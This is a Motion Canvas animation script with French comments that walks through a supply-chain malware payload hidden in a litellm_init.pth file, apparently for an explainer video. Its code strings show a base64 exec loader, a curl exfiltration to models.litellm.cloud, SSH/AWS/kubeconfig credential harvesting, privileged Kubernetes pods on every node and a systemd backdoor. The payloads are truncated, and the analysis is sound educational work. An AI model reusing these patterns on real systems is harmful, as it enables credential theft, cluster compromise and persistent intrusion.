// litellm/payload-decode.tsx
// Animation "dive" : 3 couches imbriquées du payload d'exfiltration
// Couche 1 → Python one-liner  · Couche 2 → JSON fichiers  · Couche 3 → clé RSA

import {makeScene2D} from '@motion-canvas/2d';
import {Code, LezerHighlighter, lines} from '@motion-canvas/2d';
import {Grid, Layout, Rect, Txt} from '@motion-canvas/2d/lib/components';
import {all, createRef, DEFAULT, waitFor, waitUntil} from '@motion-canvas/core';
import {parser} from '@lezer/python';
import {HighlightStyle} from '@codemirror/language';
import {tags} from '@lezer/highlight';

// ── Passe-Tech syntax theme ─────────────────────────────────────────────────
const PasseTechTheme = HighlightStyle.define([
  {tag: tags.keyword,                       color: '#FF7B93', fontWeight: '600'},
  {tag: tags.variableName,                  color: '#79C0FF'},
  {tag: tags.propertyName,                  color: '#79C0FF'},
  {tag: tags.definition(tags.variableName), color: '#79C0FF'},
  {tag: tags.string,                        color: '#6DFF8A'},
  {tag: tags.number,                        color: '#FFE14D'},
  {tag: tags.operator,                      color: '#8B949E'},
  {tag: tags.punctuation,                   color: '#6E7681'},
  {tag: tags.comment,                       color: '#484F58', fontStyle: 'italic'},
  {tag: tags.bool,                          color: '#FFE14D'},
]);

// ── Payload code layers ─────────────────────────────────────────────────────
// Couche 1 : Python one-liner injecté dans litellm_init.pth
// Le bloc base64 est sur la ligne 1 — findFirstRange('b64decode') le cible précisément
const CODE_COUCHE1 = `\
import os, subprocess, sys
subprocess.Popen(
  [sys.executable, "-c", "import base64; exec(base64.b64decode('aW1wb3XMK…ICBydW4oKQo='))"],
  stdout=subprocess.DEVNULL,
  stderr=subprocess.DEVNULL
)`;

// Couche 2 : décodage du bloc base64 — JSON listant les fichiers aspirés
// Les valeurs des clés ".ssh/id_rsa", ".env", ".aws/credentials" sont base64
// findAllRanges(/[A-Za-z0-9+/]{14,}/g) les détecte automatiquement
const CODE_COUCHE2 = `\
PUB_KEY_CONTENT = """-----BEGIN PUBLIC KEY-----
MIICI…EAAQ==
-----END PUBLIC KEY-----"""

B64_SCRIPT = "aW1wb3J0IGhdChwYXRoKQog…ICAgICAgIGlmIG5vdCBzd=="

def run():
    # ... collecte les fichiers sensibles dans un tmpdir ...
    payload = base64.b64decode(B64_SCRIPT)

    # chiffrement AES-256-CBC + clé de session RSA-OAEP
    openssl enc  -aes-256-cbc -in collected -out payload.enc -pass file:session.key
    openssl pkeyutl -encrypt -pubin -inkey pub.pem -in session.key -out session.key.enc

    # exfiltration vers le C2
    curl -X POST https://models.litellm.cloud/ \\
        -H "Content-Type: application/octet-stream" \\
        --data-binary @tpcp.tar.gz`;

// Couche 3 : décodage de ".ssh/id_rsa"
// lines(0) et lines(6) ciblent les marqueurs BEGIN / END
// Couche 3 : cœur du malware — double décodage de B64_SCRIPT
// Sections narratives : recon + vol credentials · exploit K8s · backdoor sysmon
// Ligne 8  → début exploit Kubernetes (lines(8, 21) pour le highlight K8s)
// Ligne 23 → début backdoor sysmon   (lines(23, 27) pour le highlight persistance)
const CODE_COUCHE3 = `\
# ── Recon + vol de credentials ──────────────────────────────
run('hostname; whoami; uname -a; ip addr; printenv')

for h in homes:
    emit(h + '/.ssh/id_rsa')        # clés SSH
    emit(h + '/.aws/credentials')   # AWS
    emit(h + '/.kube/config')       # kubeconfig

# ── Exploit Kubernetes ────────────────────────────────────────
if os.path.exists(SA_TOKEN_PATH):
    k8s_token = open(SA_TOKEN_PATH).read().strip()
    secrets   = k8s_get('/api/v1/secrets')

    for node in k8s_get('/api/v1/nodes')['items']:
        k8s_post('/api/v1/namespaces/kube-system/pods', {
            'spec': {
                'nodeName':   node['metadata']['name'],
                'hostPID':    True,
                'containers': [{'securityContext': {'privileged': True}}],
                'volumes':    [{'hostPath': {'path': '/'}}],
            }
        })

# ── Backdoor sysmon ───────────────────────────────────────────
PERSIST_B64 = "aW1wb3J0IHVybGxpYi5yZXF1ZXN0..."

open('~/.config/sysmon/sysmon.py', 'wb').write(base64.b64decode(PERSIST_B64))
subprocess.run(['systemctl', '--user', 'enable', '--now', 'sysmon.service'])`;

export default makeScene2D(function* (view) {
  const vW = () => view.width();
  const vH = () => view.height();

  const C = {
    bg:     '#0D1117',
    panel:  '#161B22',
    border: '#30363D',
    ghost:  '#484F58',
    cream:  '#F9F9F6',
    rose:   '#FF3E6C',
    vert:   '#6DFF8A',
    jaune:  '#FFE14D',
    blue:   '#58A6FF',
    danger: '#F85149',
  };

  // ── Refs ──────────────────────────────────────────────────────────────────
  const gridRef        = createRef<Grid>();
  const editorPanel    = createRef<Rect>();
  const editorFilename = createRef<Txt>();
  const codeRef        = createRef<Code>();
  const layerLabel     = createRef<Txt>();
  const breadcrumbRef  = createRef<Txt>();

  // Overlay glow — repositionné via getSelectionBBox() à chaque couche
  const highlightBox   = createRef<Rect>();
  const highlightLabel = createRef<Txt>();

  // Decode badge (transition entre couches)
  const decodeBadge    = createRef<Rect>();
  const decodeBadgeTxt = createRef<Txt>();

  // ── Helper : positionne l'overlay sur le résultat de getSelectionBBox ─────
  // range : CodeRange[] tel que retourné par findAllRanges / lines()
  function placeOverlay(range: [[number, number], [number, number]][]) {
    const bboxes = codeRef().getSelectionBBox(range);
    if (!bboxes.length) return;

    let x1 = Infinity, y1 = Infinity, x2 = -Infinity, y2 = -Infinity;
    for (const bbox of bboxes) {
      x1 = Math.min(x1, bbox.x);
      y1 = Math.min(y1, bbox.y);
      x2 = Math.max(x2, bbox.x + bbox.width);
      y2 = Math.max(y2, bbox.y + bbox.height);
    }

    const codeX = codeRef().x();
    const codeY = codeRef().y();

    highlightBox().x(codeX + (x1 + x2) / 2);
    highlightBox().y(codeY + (y1 + y2) / 2);
    highlightBox().width(x2 - x1 + 22);
    highlightBox().height(y2 - y1 + 10);

    highlightLabel().x(codeX + (x1 + x2) / 2);
    highlightLabel().y(codeY + y2 + 26);
  }

  // ── Scene tree ────────────────────────────────────────────────────────────
  view.add(
    <Layout key="root">
      <Rect key="bg" width={'100%'} height={'100%'} fill={C.bg} zIndex={-2} />
      <Grid
        key="grid"
        ref={gridRef}
        width={'100%'} height={'100%'}
        stroke={C.ghost} lineWidth={1} opacity={0}
        spacing={() => vW() * 0.055} zIndex={-1}
      />

      {/* ── Layer counter ── */}
      <Txt
        key="layer-label"
        ref={layerLabel}
        text="COUCHE 1 / 3"
        fill={C.ghost}
        fontSize={() => vW() * 0.015}
        fontWeight={700}
        fontFamily={'Space Grotesk'}
        y={() => vH() * -0.43}
        opacity={0}
      />

      {/* ── Breadcrumb ── */}
      <Txt
        key="breadcrumb"
        ref={breadcrumbRef}
        text="litellm_init.pth"
        fill={C.ghost}
        fontSize={() => vW() * 0.012}
        fontFamily={'DM Mono, monospace'}
        y={() => vH() * -0.39}
        opacity={0}
      />

      {/* ── Editor panel ── */}
      <Rect
        key="editor-panel"
        ref={editorPanel}
        x={0} y={() => vH() * 0.025}
        width={() => vW() * 0.82}
        height={() => vH() * 0.74}
        fill={C.panel}
        stroke={C.border}
        lineWidth={2}
        radius={() => vW() * 0.007}
        opacity={0}
        clip
        layout direction={'column'} alignItems={'stretch'} justifyContent={'start'}
      >
        {/* macOS-style title bar */}
        <Rect
          key="title-bar"
          width={'100%'}
          height={() => vH() * 0.052}
          fill={`${C.ghost}20`}
          layout direction={'row'}
          alignItems={'center'}
          padding={[0, 20]}
          gap={10}
        >
          <Rect key="dot-close"    width={13} height={13} fill={C.danger} radius={7} />
          <Rect key="dot-minimize" width={13} height={13} fill={C.jaune}  radius={7} />
          <Rect key="dot-maximize" width={13} height={13} fill={C.vert}   radius={7} />
          <Txt
            key="editor-filename"
            ref={editorFilename}
            text="litellm_init.pth"
            fill={C.ghost}
            fontSize={() => vW() * 0.012}
            fontFamily={'DM Mono, monospace'}
          />
        </Rect>
      </Rect>

      {/* Code component — sibling du panel, centré par-dessus */}
      <Code
        key="code"
        ref={codeRef}
        highlighter={new LezerHighlighter(parser, PasseTechTheme)}
        code={''}
        fontSize={() => vW() * 0.0155}
        fontFamily={'DM Mono, monospace'}
        x={0}
        y={() => vH() * 0.06}
        opacity={0}
        zIndex={3}
      />

      {/* ── Overlay glow (repositionné via getSelectionBBox) ── */}
      <Rect
        key="highlight-box"
        ref={highlightBox}
        fill={'#00000000'}
        stroke={C.jaune}
        lineWidth={2}
        radius={() => vW() * 0.003}
        shadowColor={C.jaune}
        shadowBlur={() => vW() * 0.012}
        opacity={0}
        zIndex={4}
      />
      <Txt
        key="highlight-label"
        ref={highlightLabel}
        text="base64 encodé"
        fill={C.jaune}
        fontSize={() => vW() * 0.012}
        fontFamily={'DM Mono, monospace'}
        opacity={0}
        zIndex={4}
      />

      {/* ── Decode badge (apparaît pendant la transition) ── */}
      <Rect
        key="decode-badge"
        ref={decodeBadge}
        x={0} y={() => vH() * 0.43}
        width={() => vW() * 0.34} height={() => vH() * 0.052}
        fill={`${C.jaune}15`} stroke={C.jaune} lineWidth={2}
        radius={() => vW() * 0.005} opacity={0}
        layout direction={'row'} alignItems={'center'} justifyContent={'center'} gap={12}
      >
        <Txt
          key="decode-badge-txt"
          ref={decodeBadgeTxt}
          text="base64 → décodage en cours..."
          fill={C.jaune}
          fontSize={() => vW() * 0.013}
          fontFamily={'DM Mono, monospace'}
        />
      </Rect>
    </Layout>,
  );

  // ── Animations ─────────────────────────────────────────────────────────────

  yield* waitUntil('intro');
  yield* all(
    gridRef().opacity(0.12, 0.8),
    editorPanel().opacity(1, 0.5),
  );
  yield* all(
    layerLabel().opacity(1, 0.45),
    breadcrumbRef().opacity(1, 0.4),
  );

  // ── COUCHE 1 — Python one-liner ─────────────────────────────────────────────
  yield* waitUntil('couche1');
  yield* codeRef().code(CODE_COUCHE1, 0.6);
  yield* codeRef().opacity(1, 0.4);
  yield* waitFor(1.0);

  // Highlight le b64decode : findFirstRange localise le token précisément
  yield* waitUntil('b64_payload');
  const b64Range1 = [codeRef().findFirstRange(/base64.b64decode\(\'.*\'\)/g)];
  yield* codeRef().selection(b64Range1, 0.3);
  placeOverlay(b64Range1);
  highlightLabel().text('← base64.b64decode()');
  yield* all(
    highlightBox().opacity(1, 0.35),
    highlightLabel().opacity(1, 0.35),
  );
  yield* waitFor(1.5);

  // ── Transition Couche 1 → Couche 2 ─────────────────────────────────────────
  yield* waitUntil('decode1');
  yield* all(
    highlightBox().opacity(0, 0.2),
    highlightLabel().opacity(0, 0.2),
    decodeBadge().opacity(1, 0.3),
  );
  yield* waitFor(0.55);

  yield* codeRef().selection(DEFAULT, 0);
  yield* decodeBadge().opacity(0, 0.2);

  layerLabel().text('COUCHE 2 / 3');
  editorFilename().text('payload.json  [décodé]');
  breadcrumbRef().text('litellm_init.pth → payload décodé');

  yield* codeRef().code(CODE_COUCHE2, 0.7);
  yield* waitFor(0.7);


   // Highlight toutes les valeurs base64 des fichiers avec findAllRanges
  yield* waitUntil('b64_key');
  const keyRange = [codeRef().findFirstRange(`PUB_KEY_CONTENT = """-----BEGIN PUBLIC KEY-----
MIICI…EAAQ==
-----END PUBLIC KEY-----"""`)];
  yield* codeRef().selection(keyRange, 0.3);
  placeOverlay(keyRange);
  highlightLabel().text('Clé publique de chiffrement de l`attaquant');
  yield* all(
    highlightBox().opacity(1, 0.35),
    highlightLabel().opacity(1, 0.35),
  );
  yield* waitFor(1.2);


    // Zoom sur .ssh/id_rsa uniquement — première occurrence
  yield* waitUntil('b64_sshkey');
  const sshRange = [codeRef().findFirstRange(/[A-Za-z0-9-…=+/]{15,52}/g)];
  yield* codeRef().selection(sshRange, 0.3);
  placeOverlay(sshRange);
  highlightLabel().text('base-64 → payload d`exfiltration');
  yield* waitFor(1.5);

  // Highlight toutes les valeurs base64 des fichiers avec findAllRanges
  yield* waitUntil('b64_files');
  const b64Ranges2 = [codeRef().findFirstRange('b64decode')];
  yield* codeRef().selection(b64Ranges2, 0.3);
  placeOverlay(b64Ranges2);
  highlightLabel().text('fichiers encodés en base64');
  yield* all(
    highlightBox().opacity(1, 0.35),
    highlightLabel().opacity(1, 0.35),
  );
  yield* waitFor(1.2);

  // Highlight chiffrement AES-256-CBC + enveloppe RSA-OAEP (lignes 10–12)
  yield* waitUntil('chiffrement');
  yield* all(
    highlightBox().opacity(0, 0.2),
    highlightLabel().opacity(0, 0.2),
  );
  yield* codeRef().selection(lines(10, 12), 0.35);
  placeOverlay(lines(10, 12));
  highlightLabel().text('chiffrement AES-256 + enveloppe RSA-OAEP');
  yield* all(
    highlightBox().opacity(1, 0.35),
    highlightLabel().opacity(1, 0.35),
  );
  yield* waitFor(1.8);

  // Highlight exfiltration vers models.litellm.cloud (lignes 14–17)
  yield* waitUntil('exfil');
  yield* all(
    highlightBox().opacity(0, 0.2),
    highlightLabel().opacity(0, 0.2),
  );
  yield* codeRef().selection(lines(14, 17), 0.35);
  placeOverlay(lines(14, 17));
  highlightLabel().text('exfiltration → models.litellm.cloud');
  yield* all(
    highlightBox().opacity(1, 0.35),
    highlightLabel().opacity(1, 0.35),
  );
  yield* waitFor(1.8);

  // ── Transition Couche 2 → Couche 3 ─────────────────────────────────────────
  yield* waitUntil('decode2');
  yield* all(
    highlightBox().opacity(0, 0.2),
    highlightLabel().opacity(0, 0.2),
    decodeBadge().opacity(1, 0.3),
  );
  decodeBadgeTxt().text('base64 → cœur du malware...');
  yield* waitFor(0.55);

  yield* codeRef().selection(DEFAULT, 0);
  yield* decodeBadge().opacity(0, 0.2);

  layerLabel().text('COUCHE 3 / 3');
  editorFilename().text('B64_SCRIPT  [décodé]');
  breadcrumbRef().text('litellm_init.pth → payload.py → B64_SCRIPT [décodé]');

  yield* codeRef().code(CODE_COUCHE3, 0.7);
  yield* codeRef().fontSize(() => vW() * 0.011, 0.3);
  yield* waitFor(0.5);

  // Highlight scan des clés et identifiants (lignes 0–6)
  yield* waitUntil('credScan');
  yield* codeRef().selection(lines(0, 6), 0.35);
  placeOverlay(lines(0, 6));
  highlightLabel().text('scan SSH · AWS · kubeconfig sur toutes les homes');
  yield* all(
    highlightBox().opacity(1, 0.35),
    highlightLabel().opacity(1, 0.35),
  );
  yield* waitFor(1.8);

  // Highlight exploit Kubernetes (lignes 8–21)
  yield* waitUntil('keyReveal');
  yield* all(
    highlightBox().opacity(0, 0.2),
    highlightLabel().opacity(0, 0.2),
  );
  yield* codeRef().selection(lines(8, 21), 0.35);
  placeOverlay(lines(8, 21));
  highlightLabel().text('exploit K8s — pod privilégié sur chaque nœud');
  yield* all(
    highlightBox().opacity(1, 0.35),
    highlightLabel().opacity(1, 0.35),
  );
  yield* editorPanel().stroke(C.danger, 0.5);
  yield* waitFor(1.8);

  // Highlight backdoor sysmon + systemd (lignes 23–27)
  yield* waitUntil('backdoor');
  yield* all(
    highlightBox().opacity(0, 0.2),
    highlightLabel().opacity(0, 0.2),
  );
  yield* codeRef().selection(lines(23, 27), 0.35);
  placeOverlay(lines(23, 27));
  highlightLabel().text('backdoor sysmon — persistance systemd');
  yield* all(
    highlightBox().opacity(1, 0.35),
    highlightLabel().opacity(1, 0.35),
  );
  yield* editorPanel().stroke(C.rose, 0.4);
  yield* editorPanel().lineWidth(3, 0.4);
  yield* waitFor(2.0);

  // ── End ──────────────────────────────────────────────────────────────────
  yield* waitUntil('endScene');
  yield* all(
    gridRef().opacity(0, 0.5),
    editorPanel().opacity(0, 0.5),
    codeRef().opacity(0, 0.4),
    highlightBox().opacity(0, 0.3),
    highlightLabel().opacity(0, 0.3),
    layerLabel().opacity(0, 0.4),
    breadcrumbRef().opacity(0, 0.4),
  );
});
